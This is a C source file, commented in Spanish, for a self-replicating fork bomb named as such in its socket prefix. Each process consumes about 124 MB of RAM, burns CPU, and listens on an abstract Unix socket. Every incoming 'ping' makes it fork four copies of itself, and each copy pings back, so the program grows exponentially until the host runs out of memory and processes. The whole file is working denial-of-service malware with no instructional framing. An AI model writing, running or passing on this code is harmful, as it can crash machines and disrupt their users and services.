#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>

#define NUM_CHILDREN 4
#define RAM_CONSUME_MB 60
#define MMAP_SIZE_MB 64
#define SOCKET_PREFIX "\0forkbomb_"
#define BUFFER_SIZE 64

char parent_socket_path[BUFFER_SIZE];
int parent_pid = 0;

// --- Comunicación hijo → padre vía socket abstracto ---
void notify_parent_via_socket(int parent_pid) {
    int sockfd;
    struct sockaddr_un addr;
    char msg[] = "ping";

    sockfd = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sockfd < 0) return;

    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    snprintf(parent_socket_path, BUFFER_SIZE, SOCKET_PREFIX"%d", parent_pid);
    memcpy(addr.sun_path, parent_socket_path, strlen(parent_socket_path));

    sendto(sockfd, msg, strlen(msg), 0, (struct sockaddr*)&addr, sizeof(sa_family_t) + strlen(parent_socket_path));
    close(sockfd);
}

// --- Servidor socket que escucha "ping" y genera más hijos ---
void run_socket_server(int my_pid) {
    int sockfd;
    struct sockaddr_un addr;
    char buffer[BUFFER_SIZE];

    sockfd = socket(AF_UNIX, SOCK_DGRAM, 0);
    if (sockfd < 0) return;

    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    snprintf(parent_socket_path, BUFFER_SIZE, SOCKET_PREFIX"%d", my_pid);
    memcpy(addr.sun_path, parent_socket_path, strlen(parent_socket_path));

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(sa_family_t) + strlen(parent_socket_path)) < 0) {
        perror("bind");
        close(sockfd);
        return;
    }

    while (1) {
        ssize_t bytes = recvfrom(sockfd, buffer, BUFFER_SIZE - 1, 0, NULL, NULL);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            if (strcmp(buffer, "ping") == 0) {
                for (int i = 0; i < NUM_CHILDREN; i++) {
                    fork_and_exec(my_pid);
                }
            }
        }
    }
}

// --- Crear hijos ---
void fork_and_exec(int my_pid) {
    pid_t pid = fork();

    if (pid == 0) {
        char exe_path[256];
        char pid_arg[20];

        if (readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1) == -1) exit(1);
        snprintf(pid_arg, sizeof(pid_arg), "%d", my_pid);

        char *args[] = { exe_path, pid_arg, NULL };
        execv(exe_path, args);
        exit(1); // exec falló
    }
}

// --- Consumir RAM con malloc ---
void consume_heap_ram() {
    void *leak = malloc(RAM_CONSUME_MB * 1024 * 1024);
    if (leak) memset(leak, 1, RAM_CONSUME_MB * 1024 * 1024);
}

// --- Abrir FDs ---
void open_file_descriptor() {
    int fd = open("/dev/null", O_RDONLY);
    (void)fd;
}

// --- Carga de CPU ---
void burn_cpu() {
    for (int i = 0; i < 100000000; i++) {
        volatile double x = 1.0;
        x *= x;
    }
}

// --- Presión sobre swap ---
void consume_mmap() {
    size_t size = MMAP_SIZE_MB * 1024 * 1024;
    void *map = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (map != MAP_FAILED) memset(map, 0, size);
}

// --- MAIN ---
int main(int argc, char *argv[]) {
    int my_pid = getpid();

    if (argc == 2) {
        parent_pid = atoi(argv[1]);
        notify_parent_via_socket(parent_pid);
    }

    consume_heap_ram();
    consume_mmap();
    open_file_descriptor();
    burn_cpu();

    run_socket_server(my_pid); // Bloquea aquí y escucha
    return 0;
}

